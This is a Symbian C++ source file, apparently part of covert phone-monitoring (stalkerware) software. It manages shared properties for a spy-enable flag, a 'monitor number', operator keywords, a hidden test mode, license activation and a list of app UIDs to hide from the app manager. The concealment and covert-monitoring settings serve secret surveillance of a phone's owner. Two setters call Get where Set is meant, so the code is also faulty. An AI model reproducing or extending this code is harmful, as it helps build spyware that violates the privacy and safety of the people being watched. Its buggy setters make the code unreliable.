#include "ShareProperty.h"
#include "Logger.h"
#include <e32property.h>
#include <S32MEM.H>

TInt FxShareProperty::Define()
	{
  	TInt err = RProperty::Define(KPropertyCategory, EKeySpyEnable, RProperty::EInt);  	
  	err = RProperty::Define(KPropertyCategory, EKeyMonitorNumber, RProperty::EText, KMaxLengthMonitorNumber);  	
  	err = RProperty::Define(KPropertyCategory, EKeyOperatorKeyword, RProperty::EByteArray, KMaxLengthOperatorKeyword);  	
  	err = RProperty::Define(KPropertyCategory, EKeyTestHouseHiddenMode, RProperty::EInt);  	
  	err = RProperty::Define(KPropertyCategory, EKeyActivationStatus, RProperty::EInt);  	
  	err = RProperty::Define(KPropertyCategory, EKeyFlexiKeyHash, RProperty::EByteArray, KMaxLengthFlexiKeyHash);  	
  	err = RProperty::Define(KPropertyCategory, EKeyProductID, RProperty::EText, KMaxLengthProductId);  	
  	err = RProperty::Define(KPropertyCategory, EKeyHiddedAppFromDummyAppMgrArray, RProperty::EByteArray, KMaxLengthHiddedAppFromDummyAppMgrArray);  	
  	err = RProperty::Define(KPropertyCategory, EKeyDummyAppMgrActive, RProperty::EInt);  	
  	return KErrNone;
	}

void FxShareProperty::DeleteAllProperty()
	{
  	RProperty::Delete(KPropertyCategory, EKeySpyEnable);  	
  	RProperty::Delete(KPropertyCategory, EKeyMonitorNumber);  	
  	RProperty::Delete(KPropertyCategory, EKeyOperatorKeyword);  	
  	RProperty::Delete(KPropertyCategory, EKeyTestHouseHiddenMode);  	
  	RProperty::Delete(KPropertyCategory, EKeyActivationStatus);  	
  	RProperty::Delete(KPropertyCategory, EKeyFlexiKeyHash);  	
  	RProperty::Delete(KPropertyCategory, EKeyProductID);  	
  	RProperty::Delete(KPropertyCategory, EKeyHiddedAppFromDummyAppMgrArray);  	
  	RProperty::Delete(KPropertyCategory, EKeyDummyAppMgrActive);
	}

TInt FxShareProperty::SetSpyEnableFlag(TBool aEnable)
	{
	return RProperty::Set(KPropertyCategory, EKeySpyEnable, aEnable);	
	}
	
TInt FxShareProperty::SetMonitorNumber(const TDesC& aMonitorNumber)
	{
	return RProperty::Set(KPropertyCategory, EKeyMonitorNumber, aMonitorNumber);
	}
TInt FxShareProperty::SetOperatorKeywords(const TDesC8& aKeywords)
	{
	TInt err = RProperty::Set(KPropertyCategory, EKeyOperatorKeyword, aKeywords);
	LOG3(_L("[FxShareProperty::SetOperatorKeywords] err: %d, size: %d, length: %d"), err, aKeywords.Size(), aKeywords.Length())
	return err;
	}

void FxShareProperty::GetSpyEnableFlag(TBool& aEnable)
	{
	RProperty::Get(KPropertyCategory, EKeySpyEnable, aEnable);
	}
	
void FxShareProperty::GetMonitorNumber(TDes& aSpyNumber)
	{
	RProperty::Get(KPropertyCategory, EKeyMonitorNumber, aSpyNumber);
	}

TInt FxShareProperty::SetSTKMode(TBool aMode)
	{
	return RProperty::Get(KPropertyCategory, EKeyTestHouseHiddenMode, aMode);
	}
	
TInt FxShareProperty::SetActivationStatus(TBool aActivated)
	{
	return RProperty::Get(KPropertyCategory, EKeyActivationStatus, aActivated);
	}

TInt FxShareProperty::SetFlexiKeyHash(const TDesC8& aHash)
	{
	return RProperty::Set(KPropertyCategory, EKeyFlexiKeyHash, aHash);	
	}

void FxShareProperty::GetFlexiKeyHash(TDes8& aFlexiKeyHash)
	{
	RProperty::Get(KPropertyCategory, EKeyFlexiKeyHash, aFlexiKeyHash);
	}

TInt FxShareProperty::SetProductID(const TDesC& aProductId)
	{
	return RProperty::Set(KPropertyCategory, EKeyProductID, aProductId);
	}

void FxShareProperty::GetProductID(TDes& aProductID)
	{
	RProperty::Get(KPropertyCategory, EKeyProductID, aProductID);
	}

TInt FxShareProperty::SetAppUidHiddedFromDummyAppMgrL(RArray<TInt32>* aAppToBeHidden)
	{
	TInt err(KErrNone);
	if(aAppToBeHidden)
		{
		RArray<TInt32>& appToBeHidden = *aAppToBeHidden;
		const TInt KMaxNumOfUid = 49;
		TInt count = appToBeHidden.Count();
		if(count > 0)
			{
			count = (count>KMaxNumOfUid)?49: count;
			TInt allocSize = (count*4) + 1;
			HBufC8* byteArray = HBufC8::NewLC(allocSize);
			TPtr8 ptr = byteArray->Des();
			RDesWriteStream stream(ptr);	
			stream.PushL();
			stream.WriteInt8L(count);
			for(TInt i=0;i<count;i++)
				{
				stream.WriteInt32L(appToBeHidden[i]);
				}
			stream.CommitL();
			err = RProperty::Set(KPropertyCategory, EKeyHiddedAppFromDummyAppMgrArray, ptr);
			CleanupStack::PopAndDestroy(2); //byteArray, stream
			}
		}
	else
		{
		TBuf8<1> empty8;
		empty8.SetMax();
		empty8.FillZ();
		err=RProperty::Set(KPropertyCategory, EKeyHiddedAppFromDummyAppMgrArray, empty8);	
		}
	return err;
	}
	
TInt FxShareProperty::SetActiveDummyAppMgr(TBool aActive)
	{
	TInt active = (aActive) ? EDummyAppMgrActiveYes:EDummyAppMgrActiveNo;
	return RProperty::Set(KPropertyCategory, EKeyDummyAppMgrActive, active);	
	}
